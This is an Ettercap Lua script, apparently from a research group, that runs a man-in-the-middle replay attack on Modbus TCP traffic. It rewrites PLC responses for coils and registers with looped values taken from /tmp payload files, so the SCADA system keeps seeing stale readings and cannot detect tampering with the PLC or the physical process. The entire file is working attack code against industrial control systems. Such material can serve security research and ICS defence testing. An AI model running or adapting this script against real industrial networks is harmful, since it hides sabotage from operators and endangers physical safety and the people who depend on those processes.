-- Copyright (C) 2025 CEA - All Rights Reserved
-- 
-- This program is free software: you can redistribute it and/or modify it under
-- the terms of the GNU General Public License as published by the Free Software
-- Foundation, either version 3 of the License, or (at your option) any later
-- version.
-- 
-- This program is distributed in the hope that it will be useful, but WITHOUT ANY
-- WARRANTY; without even the implied warranty of  MERCHANTABILITY or FITNESS FOR
-- A PARTICULAR PURPOSE. See the GNU General Public License for more details.
-- 
-- You should have received a copy of the GNU General Public License along with
-- this program.  If not, see <http://www.gnu.org/licenses/>.

description = "This script modifies Modbus packets so that the SCADA system continuously receives the same packet in a loop, preventing it from detecting any changes made to the PLC or the physical process."

local packet = require("packet")
local hook_points = require("hook_points")
hook_point = hook_points.tcp

-- Offsets for payload injection in different Modbus packet types
offset_01 = 1
offset_03 = 1
offset_48 = 1


-- Retrieves the payload data from a specified file
function get_payloads(filename)
    local file = io.open(filename, "r")
    if not file then
        ettercap.log("[Warning] Unable to open file: %s", filename)
        return ""
    end

    local payloads = file:read("*all")
    file:close()

    return payloads
end


-- Packet rule function used to filter Modbus packets based on TCP and port 502
packetrule = function(packet_object)
  if packet.is_tcp(packet_object) == true then
    if packet.src_port(packet_object) == 502 then
        return true
    end
  end

  return false
end


-- Action function applied to packets matching the 'packetrule' condition
action = function(packet_object) 
    local data = packet.read_data(packet_object)
    if #data<=9 then
        return nil
    end

    local modbus_header = string.sub(data, 7, 9) -- Extract the Modbus function code and ID
    local modified_data = ""

    -- Handle Modbus function 0x01 (Read Coils) requests
    if modbus_header == "\x01\x01\x01" then
        local payloads_01 = get_payloads("/tmp/payloads01")
        modified_data = string.sub(data, 1, 9) .. string.sub(payloads_01, offset_01, offset_01)
        offset_01 = ((offset_01) % (#payloads_01)) + 1 
        packet.set_data(packet_object, modified_data)
        ettercap.log("Successfully modified Modbus packet type 0x01 (Read Coils)")
    end

    -- Handle Modbus function 0x03 (Read Holding Registers) requests
    if modbus_header == "\x01\x01\x03" then
        local payloads_03 = get_payloads("/tmp/payloads03")
        modified_data = string.sub(data, 1, 9) .. string.sub(payloads_03, offset_03, offset_03 + 2)
        offset_03 = ((offset_03 + 2) % (#payloads_03)) + 1 
        packet.set_data(packet_object, modified_data)
        ettercap.log("Successfully modified Modbus packet type 0x03 (Read Holding Registers)")
    end

    -- Handle Modbus function 0x30 (Read Input Registers) requests
    if modbus_header == "\x01\x03\x30" then
        local payloads_48 = get_payloads("/tmp/payloads48")
        modified_data = string.sub(data, 1, 9) .. string.sub(payloads_48, offset_48, offset_48 + 47)
        offset_48 = ((offset_48 + 47) % (#payloads_48)) + 1 
        packet.set_data(packet_object, modified_data)
        ettercap.log("Successfully modified Modbus packet type 0x30 (Read Input Registers)")
    end

end